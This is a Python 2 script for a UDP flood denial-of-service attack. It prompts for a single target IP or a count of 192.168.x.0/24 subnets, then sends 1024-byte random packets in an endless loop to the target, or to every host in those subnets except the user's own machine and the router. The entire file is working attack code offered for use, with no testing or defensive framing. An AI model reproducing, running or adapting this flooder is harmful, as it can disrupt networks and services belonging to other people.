import socket #Imports needed libraries
import random
import time
import os 


def attack(ip,port,sent,bytes):
    try:
        sock.sendto(bytes,(ip,port))
        if sent % 100000 == 0:
            print "Sent a total of %s amount packets" % (sent)
        return True
    except Exception as e:     # most generic exception you can catch
        return False


if __name__ == "__main__":
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
    bytes=random._urandom(1024) #Creates packet
    
    to_do=raw_input('Do you want to attack single ip or a network individual target or network  i/n: ') #The IP we are attacking
    while to_do !=  "i" and to_do != "n":
        to_do=raw_input('Do you want to attack single ip or a network individual target or network  i/n: ') #The IP we are attacking
        
    if to_do == "i":
        i_p=raw_input('target ip: ') #The IP we are attacking
        port=input('Port: ') #Port we direct to attack
        sent = 1
        
        answer=raw_input('do you want to attack y/n:  ') #The IP we are attacking
        while answer !=  "y" and answer != "n":
            answer=raw_input('not an option. Do you want to attack y/n: ') #The IP we are attacking
        if answer == "y":
            while True:
                attack(i_p,port,sent,bytes)
                sent = sent +1
        elif answer == "n":
            print "not attacking"
    else:    
        
        subnet=raw_input('how many subnet network to block: ') #The IP we are attacking
        ip=raw_input('Your computer ip: ') #The IP we are attacking
        port=input('Port: ') #Port we direct to attack
        
        sent = 1
        router_ip = raw_input('router ip: ')
        start_ip = "192.168."
        
        ip_list = []
        for x in range(0,int(subnet)):
            for y in range (0,255):
                ip_list.append(start_ip +str(x) + "." +str(y))
        ip_list.remove(ip)
        ip_list.remove(router_ip)  
        
        print "the number of ip that will be atttacked: " + str(len(ip_list))  
        time.sleep(5)
        
        answer=raw_input('do you want to attack y/n:  ') #The IP we are attacking
        while answer !=  "y" and answer != "n":
            answer=raw_input('not an option. Do you want to attack y/n: ') #The IP we are attacking
            
        if answer == "y":
            while True:
                for x in range(0,len(ip_list)):
                    run = attack(ip_list[x],port,sent,bytes)
                    if run == True:
                        sent = sent +1
        elif answer == "n":
            print "not attacking"